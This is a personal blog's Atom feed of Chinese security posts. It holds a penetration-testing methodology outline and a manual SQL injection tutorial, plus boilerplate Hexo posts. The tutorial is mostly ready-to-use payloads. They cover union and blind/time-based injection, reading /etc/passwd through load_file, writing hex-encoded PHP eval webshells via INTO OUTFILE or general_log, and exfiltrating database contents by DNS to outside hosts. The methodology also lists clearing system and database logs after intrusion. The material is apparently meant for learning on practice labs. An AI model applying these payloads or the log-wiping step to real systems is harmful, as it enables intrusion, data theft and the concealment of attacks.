<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Love is a Moment Story</title>
  
  <subtitle>im very vegatable and very poor</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-08-05T07:55:43.040Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>zhang rui</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>渗透测试基本思路</title>
    <link href="http://example.com/2021/08/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/"/>
    <id>http://example.com/2021/08/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/</id>
    <published>2021-08-05T07:12:05.000Z</published>
    <updated>2021-08-05T07:55:43.040Z</updated>
    
    <content type="html"><![CDATA[<p>​         有人问我，渗透到底做啥，web渗透到底是干什么，当你拿到一个待检测得站或网站，需要做什么。以我得经验其实web渗透是一个非常简单得事情。今天我就以个人经验来谈一谈怎么去渗透一个网站。</p><hr><p><strong>一、信息收集</strong></p><ol><li>获取域名的 whois 信息,获取注册者邮箱姓名电话等。</li><li>通过站长之家、明小子、k8 等查询服务器旁站以及子域名站点，因为主站一般比较难， 所以先看看旁站有没有通用性的 cms 或者其他漏洞。</li><li>通过 DNS 域传送漏洞、备份号查询、SSl 证书、APP、微信公众号、暴力破解、DNS 历史记录、K8 C 段查询、Jsfinder、360 或华为威胁情报、证书序列号获取企业域名与 ip。</li><li>通过 Nmap、Wappalyzer、御剑等查看服务器操作系统版本，web 中间件，看看是否存在已知的漏洞，比如 IIS，APACHE,NGINX 的解析漏洞</li><li>通过 7KB、破壳扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php 探针、管理员备份文件。</li><li>google hack 进一步探测网站的信息，后台，敏感文件</li><li>敏感信息收集，如 github 源码、用 7kb、破壳扫源代码泄露（.hg、.git、cvs、svn、.DS_store 源代码泄露）、google hack、接口信息泄露、社工信息泄露、邮箱地址信息收集、网盘搜索、钟馗之眼、天眼查、威胁情报、微步在线等</li><li>通过Wappalyzer、御剑工具对网站指纹识别（包括，cms，cdn，证书等），dns 记录</li></ol><p><strong>二、漏洞扫描</strong></p><ol><li>用 AWVS、APPSCAN、长亭科技的 Xray 等扫描器检测 Web 漏洞，如 XSS,XSRF,sql 注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含， 远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等</li><li>用 namp、天镜、Nessus、极光等扫描系统 ip，对扫描出来的高危漏洞进行测试，如ms08-067、ms17-010、ms12-020、ms15-035、ms19-0708、永恒之蓝 2 代、cve-2017-7494（samba）、cve-2014-6271(破壳)、php cgi 等相关漏洞验证。</li><li>漏洞利用 </li></ol><p>​       利用以上的方式拿到 webshell，或者其他权限</p><p>   4.权限提升</p><p>​      提权服务器，比如 windows 下 mysql 的 udf 提权，serv-u 提权，windows 低版本的漏洞， 如 iis6,pr,巴西烤   肉，linux 脏牛漏洞，linux 内核版本漏洞提权，linux 下的 mysql system 提权以及 oracle 低权限提权</p><p>   5.日志清理</p><p>​      操作系统、中间件、数据库等日志进行清除</p><p>   6.总结报告及修复方案</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​         有人问我，渗透到底做啥，web渗透到底是干什么，当你拿到一个待检测得站或网站，需要做什么。以我得经验其实web渗透是一个非常简单得事情。今天我就以个人经验来谈一谈怎么去渗透一个网站。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;一、信息收集&lt;/strong&gt;</summary>
      
    
    
    
    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="信息收集" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="漏洞扫描" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>SQL手工注入入门教程</title>
    <link href="http://example.com/2021/08/03/%E6%B8%97%E9%80%8F%E7%AC%AC%E4%B8%80%E8%AF%BE/"/>
    <id>http://example.com/2021/08/03/%E6%B8%97%E9%80%8F%E7%AC%AC%E4%B8%80%E8%AF%BE/</id>
    <published>2021-08-03T09:11:01.000Z</published>
    <updated>2021-08-05T07:43:58.846Z</updated>
    
    <content type="html"><![CDATA[<h3 id="mysql基本hack函数："><a href="#mysql基本hack函数：" class="headerlink" title="mysql基本hack函数："></a>mysql基本hack函数：</h3><p>mid</p><p>SELECT MID(ColumnName, Start [, Length]) FROM TableName</p><p>LEFT(str,len)</p><p>返回字符串str的最左面len个字符</p><p>ASCII(str) =ORD</p><p>返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL</p><p>SUBSTR(str,pos,len)</p><p>从str中多少个字符开始，截取多少位</p><p>CAST</p><p>SELECT CAST(’12’ AS int)   将目标str转化为目标数据类型</p><p>IFNULL(expr1,expr2)</p><p>如果expr1不是NULL，IFNULL()返回expr1，否则它返回expr2</p><p>updatexml() extracavalue()</p><p><strong>判断字符的一些语句：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">▲left(database(),1)&gt;’s’ //left()函数</span><br><span class="line"></span><br><span class="line">Explain:database()显示数据库名称，left(a,b)从左侧截取 a 的前 b 位</span><br><span class="line"></span><br><span class="line">▲ascii(substr((select table_name from information_schema.tables where table_schema =database()limit 0,1),1,1))=101 –+ //substr()函数，ascii()函数</span><br><span class="line"></span><br><span class="line">Explain：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换 为 ascii 值</span><br><span class="line"></span><br><span class="line">▲ascii(substr((select database()),1,1))=98</span><br><span class="line"></span><br><span class="line">▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98%23 //ORD()函数，MID()函数</span><br><span class="line"></span><br><span class="line">Explain：mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位</span><br><span class="line"></span><br><span class="line">Ord()函数同 ascii()，将字符转为 ascii 值</span><br></pre></td></tr></table></figure><h3 id="LOAD-FILE"><a href="#LOAD-FILE" class="headerlink" title="LOAD_FILE"></a>LOAD_FILE</h3><p>加载本地文件（服务器上）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</span><br></pre></td></tr></table></figure><p>说明：“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的 ASCII 代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)</span><br></pre></td></tr></table></figure><p>说明：“c:/boot.ini”的 16 进制是“0x633a2f626f6f742e696e69”</p><p>select load_file(‘c:\wamp\bin\mysql\mysql5.6.17\my.ini’) into outfile‘c:\wamp\www\test.php’</p><p>可以将其他路径的文件导到web目录来供访问，一般用于把包含一句话木马的文件导出成php来链接</p><h3 id="get与post请求注释符的区别"><a href="#get与post请求注释符的区别" class="headerlink" title="get与post请求注释符的区别"></a>get与post请求注释符的区别</h3><p>一般很容易在各种教程上看到 ‘ or and 1=1 #  或 ‘ or and 1=1 –+</p><p>但可能没人告诉你什么情况下该用什么。</p><p>#是sql语句中的注释符，+ 在http请求中表示空格，但get与post中，由于http请求的转义，请求到后端sql语句拼接的时候可能会不一样。</p><p><strong>get请求的时候一般用:</strong></p><p>1′ and 1=1 –+</p><p>//这里最后的空格用+，在请求的时候不会被urlencode，到后端sql语句中就会成为一个正常的空格，– 后面的语句就会被注释。</p><p>但是如果在post里最后用加号的话就会被urlencode成%2B，实际的空格被转义才被转义成+</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1%27+or+1%3D1+--%2B&amp;passwd=111&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>post请求的时候一般用：</p><p>这时候，在post的情况下，最后一个空格，可以直接用空格，不用+来代替，因为post参数 空格会自动转成+；</p><p>而之所以不在get注入的时候使用“#”来注释，是因为，请求时，“#”不会被urlencode为“%23”，被识别为锚链接，无法传递至sql语句中。</p><p>找一个库中有哪些表名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema where table_schema =&quot;security&quot;;</span><br></pre></td></tr></table></figure><p>找一个表中有哪些列名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema where table_name =&quot;eamils&quot;;</span><br></pre></td></tr></table></figure><h3 id="AND与OR的区别"><a href="#AND与OR的区别" class="headerlink" title="AND与OR的区别"></a>AND与OR的区别</h3><p>需要理解 and和or的区别</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1.png" alt="1"></p><p>场景举例：</p><p>没有订单可以测的情况下，只能用or</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/2.png" alt="2"></p><h3 id="union联合查询注入"><a href="#union联合查询注入" class="headerlink" title="union联合查询注入"></a>union联合查询注入</h3><p>当union前面的语句为false时才会执行后面语句（这里一定先学习union查询的用法）</p><p>如以下，union语句前 先构建一个错误条件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.vuln.cn/sql/less-1/?id=1&#x27; and 1=2 union select 1,user(),database() --+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.vuln.cn/sql/less-1/?id=-1&#x27; union select 1,user(),database() --+</span><br></pre></td></tr></table></figure><p>union与order by 后面跟着的列数是跟前面的select 列数相同的，不是该表的总列数</p><p>总列数判断为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.vuln.cn/sql/less-10/?id=1&quot; and  if((select count(*) from information_schema.columns where table_name = &quot;emails&quot;)=2,sleep(5),1) --+</span><br></pre></td></tr></table></figure><p>解释：如果列数为2，则延时5秒响应。</p><p>判断某列是否存在也可以用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.vuln.cn/sql/less-10/?id=1&quot; and exists (select username from admin)</span><br></pre></td></tr></table></figure><p><strong>当union查同库其他表时，需要知道库名：</strong></p><p>如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.vuln.cn/?id=-1 uni%00on se%00lect id,hash fr%00om sql3.key</span><br></pre></td></tr></table></figure><h3 id="读文件-写shell"><a href="#读文件-写shell" class="headerlink" title="读文件/写shell"></a>读文件/写shell</h3><p>这里包含了网上常见或不常见的导出一句话的骚操作</p><h4 id="支持union的方法，最常规的方式："><a href="#支持union的方法，最常规的方式：" class="headerlink" title="支持union的方法，最常规的方式："></a>支持union的方法，最常规的方式：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.vuln.cn/sql/less-10/?id=-1&quot; union select 1,user(),3 into outfile &quot;C:\\test.txt&quot; --+</span><br></pre></td></tr></table></figure><h4 id="16进制写shell"><a href="#16进制写shell" class="headerlink" title="16进制写shell"></a>16进制写shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.vuln.cn/sql/less-10/?id=-1&quot; union select 0x3c,0x3f,0x6576616C28245F504F53545B785D293B3F3E into outfile &quot;C:\\test.php&quot; --+</span><br></pre></td></tr></table></figure><p>其中上面的16 进制组合成的是一个一句话，其实这样的sql可以过waf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;    ?   eval($_POST[x]);?&gt;</span><br></pre></td></tr></table></figure><p><strong>利用分隔符写shell</strong></p><p>如果不支持union，可以用分隔符导出一句话，当然字段数要大于2。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id=1 into outfile ‘F:\WWW\phpinfo.php’ fields terminated by ‘&lt;? phpinfo(); ?&gt;’%23     #分隔符也可以用16进制表示</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select exp(~(select * from(select &#x27;hello&#x27;)a)) into outfile &#x27;C:/out.txt&#x27;;  //但是只能写一个0进去。</span><br></pre></td></tr></table></figure><p><strong>修改sql日志路径到web下的一个php文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;;  #查看配置set global general_log = on;  #开启general log模式set global general_log_file = &#x27;/var/www/html/1.php&#x27;;   #设置日志目录为shell地址 select &#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27;  #写入shell</span><br></pre></td></tr></table></figure><p><strong>读文件：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select exp(~(select*from(select load_file(&#x27;/etc/passwd&#x27;))a));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; UPDATE table_test</span><br><span class="line">    -&gt; SET blob_col=LOAD_FILE(&#x27;/tmp/picture&#x27;)</span><br><span class="line">        -&gt; WHERE id=1;</span><br></pre></td></tr></table></figure><h3 id="基于布尔值的盲注"><a href="#基于布尔值的盲注" class="headerlink" title="基于布尔值的盲注"></a>基于布尔值的盲注</h3><p>可以通过响应的不同可以判断sql语句是否正确</p><p>枚举字符来判断字符是否存在</p><p><strong>mysql的一些特征：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 from information_schema.tables where table_schema=&quot;security&quot;；     这种情况后面只要为真，就会返回1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 from information_schema.tables where table_schema=&#x27;security&#x27; and table_name regexp &#x27;^us[a-z]&#x27; limit 0,1;</span><br></pre></td></tr></table></figure><p>当试探第二个表的时候并不是改为limit1,1，因为limit针对的是条件筛选后的过滤，所以测试其他表的时候，继续修改正则即可，如果us[a-z]为1，ua[a-z]，说明至少有两个表，一个表以us开头，另一个ua开头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101    这种情况取第二个表的时候就需要limit 2,1了，因为表的排序是固定不会变的</span><br><span class="line"></span><br><span class="line">select user() like ‘ro%’，有匹配的时候会返回1，</span><br></pre></td></tr></table></figure><p>标准的正则布尔测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=&#x27;security&#x27; and table_name regexp &#x27;^us[a-z]&#x27; limit 0,1);</span><br></pre></td></tr></table></figure><p>比如判断数据库版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.vuln.cn/sqllib/Less-5/?id=1%27and%20left(version(),1)=5%23</span><br></pre></td></tr></table></figure><p>判断是否条件成立的其他方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.vuln.cn/index.php?a=examtraining&amp;c=index&amp;id=1 and (ord(substr(database() ,1,1))-1010) &amp;m=member&amp;type=TF</span><br></pre></td></tr></table></figure><h3 id="盲注流程"><a href="#盲注流程" class="headerlink" title="盲注流程"></a>盲注流程</h3><p><strong>获取库名：</strong></p><p>and%20ord(substr(database(),1,1))&gt;80+–+</p><p><strong>获取表名：</strong></p><p>利用 substr() ascii()函数进行尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.vuln.cn/sqllib/Less-5/?id=1%27and ascii(substr((select table_name information_schema.tables where tables_schema=database() limit 0,1),1,1))=101</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.vuln.cn/sqllib/Less-5/?id=1%27and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80--+</span><br></pre></td></tr></table></figure><p><strong>获取字段名：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.vuln.cn/sqllib/Less-5/?id=1&#x27; and 1=(select 1 from information_schema.columns where table_name=&#x27;users&#x27; and column_name regexp &#x27;^username&#x27; limit 0,1)--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ord(substr((select column_name from information_schema.columns where table_name=&quot;emails&quot; limit 0,1),1,1))=105+--+</span><br></pre></td></tr></table></figure><p><strong>获取表数据：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.vuln.cn/sqllib/Less-5/?id=1%27 and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))= 68--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ord(mid((select id from emails order by id limit 0,1),1,1))&lt;105+--+</span><br></pre></td></tr></table></figure><p>通过dns获取盲注数据：<a href="http://www.vuln.cn/6805">http://www.vuln.cn/6805</a></p><p>由于union后必须跟上与前面同样的字段数，所以需要把load_file放在其中，非union直接select load_file即可</p><p>dns获取盲注数据示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.vuln.cn/SQL/Less-8/?id=1%27+union select 1,LOAD_FILE(CONCAT(&#x27;\\\\&#x27;,(select id from emails limit 0,1),&#x27;.t00ls.af6160db0692ac54d19b613b0b01a78c.tu4.org\\foobar&#x27;)),3 --+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/SQL/Less-9/?id=1%27+union select 1,LOAD_FILE(CONCAT(&#x27;\\\\&#x27;,database(),&#x27;.t00ls.af6160db0692ac54d19b613b0b01a78c.tu4.org\\foobar&#x27;)),3 --+</span><br></pre></td></tr></table></figure><p>\foobar  后面要有一串任意字符，访问远程目录的意思，所以这个“foobar”可以用任意字符替换。</p><p>还可以：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from admin where id=1 and if((select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.ceye.io\\abc&#x27;))),1,1);</span><br></pre></td></tr></table></figure><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>适用于当我们测试的时候没有任何回显来判断是否有注入，比如订单搜索，比如当sql错误的时候返回与正确的相同，我们就无法通过回显差异来判断注入</p><p>如下图代码，成立与否页面不变化</p><p><strong>延时注入</strong></p><p>适用于当我们测试的时候没有任何回显来判断是否有注入，比如订单搜索，比如当sql错误的时候返回与正确的相同，我们就无法通过回显差异来判断注入</p><p>如下图代码，成立与否页面不变化</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/3.png" alt="3"></p><p>所以就需要通过判断是否延时来确认是否有注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.vuln.cn/sqllib/Less-9/?id=1&#x27;and If(ascii(substr((select column_name from information _schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))=105,1,sleep(5))--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.vuln.cn/sql/less-9/?id=1&#x27; and if((ord(substr(user(),1,1))=114),sleep(5),1) --+</span><br></pre></td></tr></table></figure><p>如果过滤逗号，可以：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show fields from `tiny_nav` where field=&#x27;id&#x27; and sleep((&#x27;a&#x27;=(select name from tiny_manager where id=3 union select &#x27;a&#x27; order by 1 limit 1))*5)</span><br></pre></td></tr></table></figure><p>还可以利用 union select 加 order by 逐字猜解…</p><p>假设，name 是 admin</p><p>当 猜出第一个字母为 ‘a’ 时，’a’=’a’及真。用 0，1表示的话就是1，然后 sleep(1<em>5)，如果是假，那就是sleep(0</em>5)…</p><p>先基本判断有没有延时，然后在load_file来dns查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.vuln.cn/SQL/Less-8/?id=1%27+and sleep(5) --+</span><br></pre></td></tr></table></figure><p>可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.www.vuln.cn/sql/less-10/?id=1&quot; and sleep(5) order by 8 --+</span><br></pre></td></tr></table></figure><h3 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h3><p>最大的区别在于注释符的使用，and改为or而已</p><p>如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or (ord(substr(user(),1,1))&gt;1#</span><br></pre></td></tr></table></figure><p>参考文章：<a href="https://www.freebuf.com/articles/web/282145.html">https://www.freebuf.com/articles/web/282145.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;mysql基本hack函数：&quot;&gt;&lt;a href=&quot;#mysql基本hack函数：&quot; class=&quot;headerlink&quot; title=&quot;mysql基本hack函数：&quot;&gt;&lt;/a&gt;mysql基本hack函数：&lt;/h3&gt;&lt;p&gt;mid&lt;/p&gt;
&lt;p&gt;SELECT MID(</summary>
      
    
    
    
    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="mysql基本hack函数" scheme="http://example.com/tags/mysql%E5%9F%BA%E6%9C%AChack%E5%87%BD%E6%95%B0/"/>
    
    <category term="判断字符的一些语句" scheme="http://example.com/tags/%E5%88%A4%E6%96%AD%E5%AD%97%E7%AC%A6%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AF%AD%E5%8F%A5/"/>
    
    <category term="LOAD_FILE" scheme="http://example.com/tags/LOAD-FILE/"/>
    
    <category term="get与post请求注释符的区别" scheme="http://example.com/tags/get%E4%B8%8Epost%E8%AF%B7%E6%B1%82%E6%B3%A8%E9%87%8A%E7%AC%A6%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    
    <category term="AND与OR的区别" scheme="http://example.com/tags/AND%E4%B8%8EOR%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    
    <category term="union联合查询注入" scheme="http://example.com/tags/union%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/"/>
    
    <category term="基于布尔值的盲注" scheme="http://example.com/tags/%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E5%80%BC%E7%9A%84%E7%9B%B2%E6%B3%A8/"/>
    
    <category term="延时注入" scheme="http://example.com/tags/%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5/"/>
    
    <category term="post注入" scheme="http://example.com/tags/post%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>hexo 命令行</title>
    <link href="http://example.com/2021/08/02/hexo%E5%91%BD%E4%BB%A4%E8%A1%8C/"/>
    <id>http://example.com/2021/08/02/hexo%E5%91%BD%E4%BB%A4%E8%A1%8C/</id>
    <published>2021-08-02T15:34:52.121Z</published>
    <updated>2021-08-03T08:16:29.456Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>hello-world</title>
    <link href="http://example.com/2021/05/02/my-first-blog/"/>
    <id>http://example.com/2021/05/02/my-first-blog/</id>
    <published>2021-05-02T09:30:00.000Z</published>
    <updated>2021-08-05T07:43:48.919Z</updated>
    
    <content type="html"><![CDATA[<p>Hello, World是指在电脑屏幕显示“Hello, World!”（你好，世界！）字符串的计算机程序。相关的程序通常都是每种电脑编程语言最基本、最简单的程序，也会用作示范一个编程语言如何运作。同时它亦可以用来确认一个编程语言的编译器、程序开发环境及运行环境是否已经安装妥当。因为写法简单可见，这也是很多初学者首次接触编程语言时会撰写的程序。</p><div class="alert alert-success"><p>成功啦o(<em>￣▽￣</em>)ブ</p></div><div class="alert alert-danger"><p>有危险Σ(っ °Д °;)っ</p></div><div class="alert alert-info"><p>有消息(・∀・(・∀・(・∀・*)</p></div><div class="alert alert-warning"><p>当心哦≧ ﹏ ≦</p></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% alertbox success &quot;成功啦o(*￣▽￣*)ブ&quot; %&#125;</span><br><span class="line">&#123;% alertbox danger &quot;有危险Σ(っ °Д °;)っ&quot; %&#125;</span><br><span class="line">&#123;% alertbox info &quot;有消息(・∀・(・∀・(・∀・*)&quot; %&#125;</span><br><span class="line">&#123;% alertbox warning &quot;当心哦≧ ﹏ ≦&quot; %&#125;</span><br></pre></td></tr></table></figure><div class="xControl">    <div class="xHeading"><div class="xIcon"><i class="fa fa-plus"></i></div><span>折叠框的标题</span></div>    <div class="xContent"><div class="inner">        <p>被折叠的内容 1<br>被折叠的内容 2<br>…</p>     </div></div>    </div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% collapse 折叠框的标题 %&#125;</span><br><span class="line"></span><br><span class="line">被折叠的内容 1</span><br><span 